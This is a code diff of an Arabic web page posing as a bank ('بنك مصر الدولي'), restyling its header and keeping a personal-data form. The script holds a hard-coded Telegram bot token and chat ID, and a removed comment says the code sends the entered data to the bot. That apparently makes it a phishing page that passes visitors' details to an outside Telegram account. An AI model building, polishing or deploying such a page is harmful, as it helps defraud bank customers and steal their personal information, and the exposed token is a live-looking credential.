@@ -12,34 +12,17 @@
       background: #f1eeee;
       color: #252525;
     }
-    
-    /* تنسيق قسم الهيدر الذي يحتوي على الصور */
     header {
-      background: white;
+      background: #861f35;
+      color: white;
       text-align: center;
-      padding: 10px;
-      border-bottom: 5px solid #d9ae38; /* الحفاظ على الخط الذهبي المميز */
+      padding: 30px 15px;
+      border-bottom: 5px solid #d9ae38;
     }
-
-    /* تنسيق الصور لتكون متجاوبة وتظهر بشكل لائق */
-    .header-image {
-      max-width: 100%; /* لا تخرج الصورة عن حدود الشاشة */
-      height: auto;
-      display: block;
-      margin: 10px auto; /* توسيط الصور وإضافة مسافة بينها */
-      border-radius: 8px; /* حواف ناعمة للصور */
+    header h1 {
+      margin: 0;
+      font-size: 32px;
     }
-
-    /* تعديل حجم لوجو بنك مصر ليكون أنسب في الهيدر */
-    #logo-img {
-      max-height: 120px;
-    }
-    
-    /* تعديل حجم صورة البطاقات البنكية */
-    #cards-img {
-      max-height: 250px;
-    }
-
     .container {
       width: 92%;
       max-width: 950px;
@@ -105,15 +88,8 @@
 </head>
 <body>
   <header>
-    <!-- وضع الصور في بداية الموقع باستخدام Data URIs -->
-    
-    <!-- صورة لوجو بنك مصر -->
-    <img src="data:image/jpeg;base64,...(تعديل: تم حذف كود الصورة الطويل للاختصار)..." alt="لوجو بنك مصر" class="header-image" id="logo-img">
-    
-    <!-- صورة البطاقات البنكية -->
-    <img src="data:image/jpeg;base64,...(تعديل: تم حذف كود الصورة الطويل للاختصار)..." alt="بطاقات بنك مصر" class="header-image" id="cards-img">
+    <h1>بنك مصر الدولي</h1>
   </header>
-  
   <div class="container">
     <section class="card">
       <h2>البيانات الشخصية</h2>
@@ -135,13 +111,11 @@
       <div id="result" aria-live="polite"></div>
     </section>
   </div>
-  
   <footer>
     بنك مصر الدولي
   </footer>
 
   <script>
-    // الحفاظ على كود الجافا سكريبت كما هو لإرسال البيانات للبوت
     const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
     const CHAT_ID = "7713496654";
 
